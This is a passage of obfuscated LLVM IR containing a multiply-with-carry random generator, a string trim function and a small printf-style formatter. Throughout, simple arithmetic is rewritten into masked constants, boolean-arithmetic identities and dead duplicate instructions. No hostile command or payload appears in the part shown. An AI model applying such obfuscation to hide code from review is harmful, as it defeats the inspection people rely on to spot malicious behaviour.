  %30 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %29
  %31 = load i32, i32* %30, align 4
  %32 = load i32, i32* %3, align 4
  %33 = sub i32 0, 2
  %34 = add i32 %32, %33
  %35 = sub nsw i32 %32, 2
  %36 = sext i32 %34 to i64
  %37 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %36
  %38 = load i32, i32* %37, align 4
  %39 = xor i32 %31, -1
  %40 = and i32 -284189112, %39
  %41 = xor i32 -284189112, -1
  %42 = and i32 %31, %41
  %43 = xor i32 %38, -1
  %44 = and i32 %43, -284189112
  %45 = and i32 %38, %41
  %46 = or i32 %40, %42
  %47 = or i32 %44, %45
  %48 = xor i32 %46, %47
  %49 = xor i32 %31, %38
  %50 = xor i32 %48, -1
  %51 = and i32 -176864238, %50
  %52 = xor i32 -176864238, -1
  %53 = and i32 %48, %52
  %54 = xor i32 -1640531527, -1
  %55 = and i32 %54, -176864238
  %56 = and i32 -1640531527, %52
  %57 = or i32 %51, %53
  %58 = or i32 %55, %56
  %59 = xor i32 %57, %58
  %60 = xor i32 %48, -1640531527
  %61 = load i32, i32* %3, align 4
  %62 = xor i32 %59, -1
  %63 = and i32 %61, %62
  %64 = xor i32 %61, -1
  %65 = and i32 %59, %64
  %66 = or i32 %63, %65
  %67 = xor i32 %59, %61
  %68 = load i32, i32* %3, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %69
  store i32 %66, i32* %70, align 4
  br label %71

; <label>:71:                                     ; preds = %23
  %72 = load i32, i32* %3, align 4
  %73 = sub i32 0, 1
  %74 = sub i32 %72, %73
  %75 = add nsw i32 %72, 1
  store i32 %74, i32* %3, align 4
  br label %20

; <label>:76:                                     ; preds = %20
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = sub i32 0, %5
  %7 = sub i32 0, 1
  %8 = add i32 %6, %7
  %9 = sub i32 0, %8
  %10 = add i32 %5, 1
  %11 = xor i32 %9, -1
  %12 = xor i32 4095, -1
  %13 = xor i32 -2103744980, -1
  %14 = or i32 %11, %12
  %15 = or i32 -2103744980, %13
  %16 = xor i32 %14, -1
  %17 = and i32 %16, %15
  %18 = and i32 %9, 4095
  store i32 %17, i32* @rand_cmwc.i, align 4
  %19 = load i64, i64* %2, align 8
  %20 = load i32, i32* @rand_cmwc.i, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = zext i32 %23 to i64
  %25 = mul i64 %19, %24
  %26 = load i32, i32* @c, align 4
  %27 = zext i32 %26 to i64
  %28 = add i64 %25, 6582306074192416424
  %29 = add i64 %28, %27
  %30 = sub i64 %29, 6582306074192416424
  %31 = add i64 %25, %27
  store i64 %30, i64* %1, align 8
  %32 = load i64, i64* %1, align 8
  %33 = lshr i64 %32, 32
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* @c, align 4
  %35 = load i64, i64* %1, align 8
  %36 = load i32, i32* @c, align 4
  %37 = zext i32 %36 to i64
  %38 = sub i64 %35, 106553049200710499
  %39 = add i64 %38, %37
  %40 = add i64 %39, 106553049200710499
  %41 = add i64 %35, %37
  %42 = trunc i64 %40 to i32
  store i32 %42, i32* %3, align 4
  %43 = load i32, i32* %3, align 4
  %44 = load i32, i32* @c, align 4
  %45 = icmp ult i32 %43, %44
  br i1 %45, label %46, label %59

; <label>:46:                                     ; preds = %0
  %47 = load i32, i32* %3, align 4
  %48 = sub i32 0, %47
  %49 = sub i32 0, 1
  %50 = add i32 %48, %49
  %51 = sub i32 0, %50
  %52 = add i32 %47, 1
  store i32 %51, i32* %3, align 4
  %53 = load i32, i32* @c, align 4
  %54 = sub i32 0, %53
  %55 = sub i32 0, 1
  %56 = add i32 %54, %55
  %57 = sub i32 0, %56
  %58 = add i32 %53, 1
  store i32 %57, i32* @c, align 4
  br label %59

; <label>:59:                                     ; preds = %46, %0
  %60 = load i32, i32* %4, align 4
  %61 = load i32, i32* %3, align 4
  %62 = sub i32 0, %61
  %63 = add i32 %60, %62
  %64 = sub i32 %60, %61
  %65 = load i32, i32* @rand_cmwc.i, align 4
  %66 = zext i32 %65 to i64
  %67 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %66
  store i32 %63, i32* %67, align 4
  ret i32 %63
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 %7, 210378791136821312
  %9 = sub i64 %8, 1
  %10 = add i64 %9, 210378791136821312
  %11 = sub i64 %7, 1
  %12 = trunc i64 %10 to i32
  store i32 %12, i32* %5, align 4
  br label %13

; <label>:13:                                     ; preds = %22, %1
  %14 = load i8*, i8** %2, align 8
  %15 = load i32, i32* %4, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds i8, i8* %14, i64 %16
  %18 = load i8, i8* %17, align 1
  %19 = sext i8 %18 to i32
  %20 = call i32 @isspace(i32 %19) #10
  %21 = icmp ne i32 %20, 0
  br i1 %21, label %22, label %27

; <label>:22:                                     ; preds = %13
  %23 = load i32, i32* %4, align 4
  %24 = sub i32 0, 1
  %25 = sub i32 %23, %24
  %26 = add nsw i32 %23, 1
  store i32 %25, i32* %4, align 4
  br label %13

; <label>:27:                                     ; preds = %13
  br label %28

; <label>:28:                                     ; preds = %43, %27
  %29 = load i32, i32* %5, align 4
  %30 = load i32, i32* %4, align 4
  %31 = icmp sge i32 %29, %30
  br i1 %31, label %32, label %41

; <label>:32:                                     ; preds = %28
  %33 = load i8*, i8** %2, align 8
  %34 = load i32, i32* %5, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds i8, i8* %33, i64 %35
  %37 = load i8, i8* %36, align 1
  %38 = sext i8 %37 to i32
  %39 = call i32 @isspace(i32 %38) #10
  %40 = icmp ne i32 %39, 0
  br label %41

; <label>:41:                                     ; preds = %32, %28
  %42 = phi i1 [ false, %28 ], [ %40, %32 ]
  br i1 %42, label %43, label %49

; <label>:43:                                     ; preds = %41
  %44 = load i32, i32* %5, align 4
  %45 = add i32 %44, -1880622078
  %46 = add i32 %45, -1
  %47 = sub i32 %46, -1880622078
  %48 = add nsw i32 %44, -1
  store i32 %47, i32* %5, align 4
  br label %28

; <label>:49:                                     ; preds = %41
  %50 = load i32, i32* %4, align 4
  store i32 %50, i32* %3, align 4
  br label %51

; <label>:51:                                     ; preds = %70, %49
  %52 = load i32, i32* %3, align 4
  %53 = load i32, i32* %5, align 4
  %54 = icmp sle i32 %52, %53
  br i1 %54, label %55, label %77

; <label>:55:                                     ; preds = %51
  %56 = load i8*, i8** %2, align 8
  %57 = load i32, i32* %3, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds i8, i8* %56, i64 %58
  %60 = load i8, i8* %59, align 1
  %61 = load i8*, i8** %2, align 8
  %62 = load i32, i32* %3, align 4
  %63 = load i32, i32* %4, align 4
  %64 = add i32 %62, -423800167
  %65 = sub i32 %64, %63
  %66 = sub i32 %65, -423800167
  %67 = sub nsw i32 %62, %63
  %68 = sext i32 %66 to i64
  %69 = getelementptr inbounds i8, i8* %61, i64 %68
  store i8 %60, i8* %69, align 1
  br label %70

; <label>:70:                                     ; preds = %55
  %71 = load i32, i32* %3, align 4
  %72 = sub i32 0, %71
  %73 = sub i32 0, 1
  %74 = add i32 %72, %73
  %75 = sub i32 0, %74
  %76 = add nsw i32 %71, 1
  store i32 %75, i32* %3, align 4
  br label %51

; <label>:77:                                     ; preds = %51
  %78 = load i8*, i8** %2, align 8
  %79 = load i32, i32* %3, align 4
  %80 = load i32, i32* %4, align 4
  %81 = sub i32 0, %80
  %82 = add i32 %79, %81
  %83 = sub nsw i32 %79, %80
  %84 = sext i32 %82 to i64
  %85 = getelementptr inbounds i8, i8* %78, i64 %84
  store i8 0, i8* %85, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %340, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %343

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %328

; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %22
  br label %343

; <label>:30:                                     ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %30
  br label %329

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

; <label>:41:                                     ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

; <label>:44:                                     ; preds = %41, %36
  br label %45

; <label>:45:                                     ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %70

; <label>:50:                                     ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = xor i32 %53, -1
  %55 = xor i32 2, -1
  %56 = xor i32 -122864982, -1
  %57 = and i32 %54, -122864982
  %58 = and i32 %53, %56
  %59 = and i32 %55, -122864982
  %60 = and i32 2, %56
  %61 = or i32 %57, %58
  %62 = or i32 %59, %60
  %63 = xor i32 %61, %62
  %64 = or i32 %54, %55
  %65 = xor i32 %64, -1
  %66 = or i32 -122864982, %56
  %67 = and i32 %65, %66
  %68 = or i32 %63, %67
  %69 = or i32 %53, 2
  store i32 %68, i32* %8, align 4
  br label %45

; <label>:70:                                     ; preds = %45
  br label %71

; <label>:71:                                     ; preds = %98, %70
  %72 = load i8*, i8** %5, align 8
  %73 = load i8, i8* %72, align 1
  %74 = zext i8 %73 to i32
  %75 = icmp sge i32 %74, 48
  br i1 %75, label %76, label %81

; <label>:76:                                     ; preds = %71
  %77 = load i8*, i8** %5, align 8
  %78 = load i8, i8* %77, align 1
  %79 = zext i8 %78 to i32
  %80 = icmp sle i32 %79, 57
  br label %81

; <label>:81:                                     ; preds = %76, %71
  %82 = phi i1 [ false, %71 ], [ %80, %76 ]
  br i1 %82, label %83, label %101

; <label>:83:                                     ; preds = %81
  %84 = load i32, i32* %7, align 4
  %85 = mul nsw i32 %84, 10
  store i32 %85, i32* %7, align 4
  %86 = load i8*, i8** %5, align 8
  %87 = load i8, i8* %86, align 1
  %88 = zext i8 %87 to i32
  %89 = add i32 %88, -1608148113
  %90 = sub i32 %89, 48
  %91 = sub i32 %90, -1608148113
  %92 = sub nsw i32 %88, 48
  %93 = load i32, i32* %7, align 4
  %94 = sub i32 %93, 275694546
  %95 = add i32 %94, %91
  %96 = add i32 %95, 275694546
  %97 = add nsw i32 %93, %91
  store i32 %96, i32* %7, align 4
  br label %98

; <label>:98:                                     ; preds = %83
  %99 = load i8*, i8** %5, align 8
  %100 = getelementptr inbounds i8, i8* %99, i32 1
  store i8* %100, i8** %5, align 8
  br label %71

; <label>:101:                                    ; preds = %81
  %102 = load i8*, i8** %5, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 115
  br i1 %105, label %106, label %146

; <label>:106:                                    ; preds = %101
  %107 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %108 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %107, i32 0, i32 0
  %109 = load i32, i32* %108, align 8
  %110 = icmp ule i32 %109, 40
  br i1 %110, label %111, label %120

; <label>:111:                                    ; preds = %106
  %112 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %107, i32 0, i32 3
  %113 = load i8*, i8** %112, align 8
  %114 = getelementptr i8, i8* %113, i32 %109
  %115 = bitcast i8* %114 to i32*
  %116 = sub i32 %109, 1622366145
  %117 = add i32 %116, 8
  %118 = add i32 %117, 1622366145
  %119 = add i32 %109, 8
  store i32 %118, i32* %108, align 8
  br label %125

; <label>:120:                                    ; preds = %106
  %121 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %107, i32 0, i32 2
  %122 = load i8*, i8** %121, align 8
  %123 = bitcast i8* %122 to i32*
  %124 = getelementptr i8, i8* %122, i32 8
  store i8* %124, i8** %121, align 8
  br label %125

; <label>:125:                                    ; preds = %120, %111
  %126 = phi i32* [ %115, %111 ], [ %123, %120 ]
  %127 = load i32, i32* %126, align 4
  %128 = sext i32 %127 to i64
  %129 = inttoptr i64 %128 to i8*
  store i8* %129, i8** %11, align 8
  %130 = load i8**, i8*** %4, align 8
  %131 = load i8*, i8** %11, align 8
  %132 = icmp ne i8* %131, null
  br i1 %132, label %133, label %135

; <label>:133:                                    ; preds = %125
  %134 = load i8*, i8** %11, align 8
  br label %136

; <label>:135:                                    ; preds = %125
  br label %136

; <label>:136:                                    ; preds = %135, %133
  %137 = phi i8* [ %134, %133 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.423, i32 0, i32 0), %135 ]
  %138 = load i32, i32* %7, align 4
  %139 = load i32, i32* %8, align 4
  %140 = call i32 @prints(i8** %130, i8* %137, i32 %138, i32 %139)
  %141 = load i32, i32* %9, align 4
  %142 = add i32 %141, -510975855
  %143 = add i32 %142, %140
  %144 = sub i32 %143, -510975855
  %145 = add nsw i32 %141, %140
  store i32 %144, i32* %9, align 4
  br label %340

; <label>:146:                                    ; preds = %101
  %147 = load i8*, i8** %5, align 8
  %148 = load i8, i8* %147, align 1
  %149 = zext i8 %148 to i32
  %150 = icmp eq i32 %149, 100
  br i1 %150, label %151, label %182

; <label>:151:                                    ; preds = %146
  %152 = load i8**, i8*** %4, align 8
  %153 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %154 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %153, i32 0, i32 0
  %155 = load i32, i32* %154, align 8
  %156 = icmp ule i32 %155, 40
  br i1 %156, label %157, label %166

; <label>:157:                                    ; preds = %151
  %158 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %153, i32 0, i32 3
  %159 = load i8*, i8** %158, align 8
  %160 = getelementptr i8, i8* %159, i32 %155
  %161 = bitcast i8* %160 to i32*
  %162 = sub i32 %155, -991656878
  %163 = add i32 %162, 8
  %164 = add i32 %163, -991656878
  %165 = add i32 %155, 8
  store i32 %164, i32* %154, align 8
  br label %171

; <label>:166:                                    ; preds = %151
  %167 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %153, i32 0, i32 2
  %168 = load i8*, i8** %167, align 8
  %169 = bitcast i8* %168 to i32*
  %170 = getelementptr i8, i8* %168, i32 8
  store i8* %170, i8** %167, align 8
  br label %171

; <label>:171:                                    ; preds = %166, %157
  %172 = phi i32* [ %161, %157 ], [ %169, %166 ]
  %173 = load i32, i32* %172, align 4
  %174 = load i32, i32* %7, align 4
  %175 = load i32, i32* %8, align 4
  %176 = call i32 @printi(i8** %152, i32 %173, i32 10, i32 1, i32 %174, i32 %175, i32 97)
  %177 = load i32, i32* %9, align 4
  %178 = sub i32 %177, 2039992908
  %179 = add i32 %178, %176
  %180 = add i32 %179, 2039992908
  %181 = add nsw i32 %177, %176
  store i32 %180, i32* %9, align 4
  br label %340

; <label>:182:                                    ; preds = %146
  %183 = load i8*, i8** %5, align 8
  %184 = load i8, i8* %183, align 1
  %185 = zext i8 %184 to i32
  %186 = icmp eq i32 %185, 120
  br i1 %186, label %187, label %219

; <label>:187:                                    ; preds = %182
  %188 = load i8**, i8*** %4, align 8
  %189 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %190 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %189, i32 0, i32 0
  %191 = load i32, i32* %190, align 8
  %192 = icmp ule i32 %191, 40
  br i1 %192, label %193, label %203

; <label>:193:                                    ; preds = %187
  %194 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %189, i32 0, i32 3
  %195 = load i8*, i8** %194, align 8
  %196 = getelementptr i8, i8* %195, i32 %191
  %197 = bitcast i8* %196 to i32*
  %198 = sub i32 0, %191
  %199 = sub i32 0, 8
  %200 = add i32 %198, %199
  %201 = sub i32 0, %200
  %202 = add i32 %191, 8
  store i32 %201, i32* %190, align 8
  br label %208

; <label>:203:                                    ; preds = %187
  %204 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %189, i32 0, i32 2
  %205 = load i8*, i8** %204, align 8
  %206 = bitcast i8* %205 to i32*
  %207 = getelementptr i8, i8* %205, i32 8
  store i8* %207, i8** %204, align 8
  br label %208

; <label>:208:                                    ; preds = %203, %193
  %209 = phi i32* [ %197, %193 ], [ %206, %203 ]
  %210 = load i32, i32* %209, align 4
  %211 = load i32, i32* %7, align 4
  %212 = load i32, i32* %8, align 4
  %213 = call i32 @printi(i8** %188, i32 %210, i32 16, i32 0, i32 %211, i32 %212, i32 97)
  %214 = load i32, i32* %9, align 4
  %215 = add i32 %214, 13972262
  %216 = add i32 %215, %213
  %217 = sub i32 %216, 13972262
  %218 = add nsw i32 %214, %213
  store i32 %217, i32* %9, align 4
  br label %340

; <label>:219:                                    ; preds = %182
  %220 = load i8*, i8** %5, align 8
  %221 = load i8, i8* %220, align 1
  %222 = zext i8 %221 to i32
  %223 = icmp eq i32 %222, 88
  br i1 %223, label %224, label %253

; <label>:224:                                    ; preds = %219
  %225 = load i8**, i8*** %4, align 8
  %226 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %227 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %226, i32 0, i32 0
  %228 = load i32, i32* %227, align 8
  %229 = icmp ule i32 %228, 40
  br i1 %229, label %230, label %238

; <label>:230:                                    ; preds = %224
  %231 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %226, i32 0, i32 3
  %232 = load i8*, i8** %231, align 8
  %233 = getelementptr i8, i8* %232, i32 %228
  %234 = bitcast i8* %233 to i32*
  %235 = sub i32 0, 8
  %236 = sub i32 %228, %235
  %237 = add i32 %228, 8
  store i32 %236, i32* %227, align 8
  br label %243

; <label>:238:                                    ; preds = %224
  %239 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %226, i32 0, i32 2
  %240 = load i8*, i8** %239, align 8
  %241 = bitcast i8* %240 to i32*
  %242 = getelementptr i8, i8* %240, i32 8
  store i8* %242, i8** %239, align 8
  br label %243

; <label>:243:                                    ; preds = %238, %230
  %244 = phi i32* [ %234, %230 ], [ %241, %238 ]
  %245 = load i32, i32* %244, align 4
  %246 = load i32, i32* %7, align 4
  %247 = load i32, i32* %8, align 4
  %248 = call i32 @printi(i8** %225, i32 %245, i32 16, i32 0, i32 %246, i32 %247, i32 65)
  %249 = load i32, i32* %9, align 4
  %250 = sub i32 0, %248
  %251 = sub i32 %249, %250
  %252 = add nsw i32 %249, %248
  store i32 %251, i32* %9, align 4
  br label %340

; <label>:253:                                    ; preds = %219
  %254 = load i8*, i8** %5, align 8
  %255 = load i8, i8* %254, align 1
  %256 = zext i8 %255 to i32
  %257 = icmp eq i32 %256, 117
  br i1 %257, label %258, label %287

; <label>:258:                                    ; preds = %253
  %259 = load i8**, i8*** %4, align 8
  %260 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %261 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %260, i32 0, i32 0
  %262 = load i32, i32* %261, align 8
  %263 = icmp ule i32 %262, 40
  br i1 %263, label %264, label %272

; <label>:264:                                    ; preds = %258
  %265 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %260, i32 0, i32 3
  %266 = load i8*, i8** %265, align 8
  %267 = getelementptr i8, i8* %266, i32 %262
  %268 = bitcast i8* %267 to i32*
  %269 = sub i32 0, 8
  %270 = sub i32 %262, %269
  %271 = add i32 %262, 8
  store i32 %270, i32* %261, align 8
  br label %277

; <label>:272:                                    ; preds = %258
  %273 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %260, i32 0, i32 2
  %274 = load i8*, i8** %273, align 8
  %275 = bitcast i8* %274 to i32*
  %276 = getelementptr i8, i8* %274, i32 8
  store i8* %276, i8** %273, align 8
  br label %277

; <label>:277:                                    ; preds = %272, %264
  %278 = phi i32* [ %268, %264 ], [ %275, %272 ]
  %279 = load i32, i32* %278, align 4
  %280 = load i32, i32* %7, align 4
  %281 = load i32, i32* %8, align 4
  %282 = call i32 @printi(i8** %259, i32 %279, i32 10, i32 0, i32 %280, i32 %281, i32 97)
  %283 = load i32, i32* %9, align 4
  %284 = sub i32 0, %282
  %285 = sub i32 %283, %284
  %286 = add nsw i32 %283, %282
  store i32 %285, i32* %9, align 4
  br label %340

; <label>:287:                                    ; preds = %253
  %288 = load i8*, i8** %5, align 8
  %289 = load i8, i8* %288, align 1
  %290 = zext i8 %289 to i32
  %291 = icmp eq i32 %290, 99
  br i1 %291, label %292, label %327

; <label>:292:                                    ; preds = %287
  %293 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %294 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %293, i32 0, i32 0
  %295 = load i32, i32* %294, align 8
  %296 = icmp ule i32 %295, 40
  br i1 %296, label %297, label %307

; <label>:297:                                    ; preds = %292
  %298 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %293, i32 0, i32 3
  %299 = load i8*, i8** %298, align 8
  %300 = getelementptr i8, i8* %299, i32 %295
  %301 = bitcast i8* %300 to i32*
  %302 = sub i32 0, %295
  %303 = sub i32 0, 8
  %304 = add i32 %302, %303
  %305 = sub i32 0, %304
  %306 = add i32 %295, 8
  store i32 %305, i32* %294, align 8
  br label %312

; <label>:307:                                    ; preds = %292
  %308 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %293, i32 0, i32 2
  %309 = load i8*, i8** %308, align 8
  %310 = bitcast i8* %309 to i32*
  %311 = getelementptr i8, i8* %309, i32 8
  store i8* %311, i8** %308, align 8
  br label %312

; <label>:312:                                    ; preds = %307, %297
  %313 = phi i32* [ %301, %297 ], [ %310, %307 ]
  %314 = load i32, i32* %313, align 4
  %315 = trunc i32 %314 to i8
  %316 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %315, i8* %316, align 1
  %317 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %317, align 1
  %318 = load i8**, i8*** %4, align 8
  %319 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %320 = load i32, i32* %7, align 4
  %321 = load i32, i32* %8, align 4
  %322 = call i32 @prints(i8** %318, i8* %319, i32 %320, i32 %321)
  %323 = load i32, i32* %9, align 4
  %324 = sub i32 0, %322
  %325 = sub i32 %323, %324
  %326 = add nsw i32 %323, %322
  store i32 %325, i32* %9, align 4
  br label %340

; <label>:327:                                    ; preds = %287
  br label %339

; <label>:328:                                    ; preds = %17
  br label %329

; <label>:329:                                    ; preds = %328, %35
  %330 = load i8**, i8*** %4, align 8
  %331 = load i8*, i8** %5, align 8
  %332 = load i8, i8* %331, align 1
  %333 = zext i8 %332 to i32
  call void @printchar(i8** %330, i32 %333)
  %334 = load i32, i32* %9, align 4
  %335 = sub i32 %334, -353105620
  %336 = add i32 %335, 1
  %337 = add i32 %336, -353105620
  %338 = add nsw i32 %334, 1
  store i32 %337, i32* %9, align 4
  br label %339

; <label>:339:                                    ; preds = %329, %327
  br label %340

; <label>:340:                                    ; preds = %339, %312, %277, %243, %208, %171, %136
  %341 = load i8*, i8** %5, align 8
  %342 = getelementptr inbounds i8, i8* %341, i32 1
  store i8* %342, i8** %5, align 8
  br label %12

; <label>:343:                                    ; preds = %29, %12
  %344 = load i8**, i8*** %4, align 8
  %345 = icmp ne i8** %344, null
  br i1 %345, label %346, label %349

; <label>:346:                                    ; preds = %343
  %347 = load i8**, i8*** %4, align 8
  %348 = load i8*, i8** %347, align 8
  store i8 0, i8* %348, align 1
  br label %349

; <label>:349:                                    ; preds = %346, %343
  %350 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %351 = bitcast %struct.__va_list_tag* %350 to i8*
  call void @llvm.va_end(i8* %351)
  %352 = load i32, i32* %9, align 4
  ret i32 %352
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %55

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %27, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %30

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = sub i32 %22, -1879838862
  %24 = add i32 %23, 1
  %25 = add i32 %24, -1879838862
  %26 = add nsw i32 %22, 1
  store i32 %25, i32* %11, align 4
  br label %27

; <label>:27:                                     ; preds = %21
  %28 = load i8*, i8** %12, align 8
  %29 = getelementptr inbounds i8, i8* %28, i32 1
  store i8* %29, i8** %12, align 8
  br label %17

; <label>:30:                                     ; preds = %17
  %31 = load i32, i32* %11, align 4
  %32 = load i32, i32* %7, align 4
  %33 = icmp sge i32 %31, %32
  br i1 %33, label %34, label %35

; <label>:34:                                     ; preds = %30
  store i32 0, i32* %7, align 4
  br label %42

; <label>:35:                                     ; preds = %30
  %36 = load i32, i32* %11, align 4
  %37 = load i32, i32* %7, align 4
  %38 = sub i32 %37, -1186216573
  %39 = sub i32 %38, %36
  %40 = add i32 %39, -1186216573
  %41 = sub nsw i32 %37, %36
  store i32 %40, i32* %7, align 4
  br label %42

; <label>:42:                                     ; preds = %35, %34
  %43 = load i32, i32* %8, align 4
  %44 = xor i32 %43, -1
  %45 = xor i32 2, -1
  %46 = xor i32 -761704373, -1
  %47 = or i32 %44, %45
  %48 = or i32 -761704373, %46
  %49 = xor i32 %47, -1
  %50 = and i32 %49, %48
  %51 = and i32 %43, 2
  %52 = icmp ne i32 %50, 0
  br i1 %52, label %53, label %54

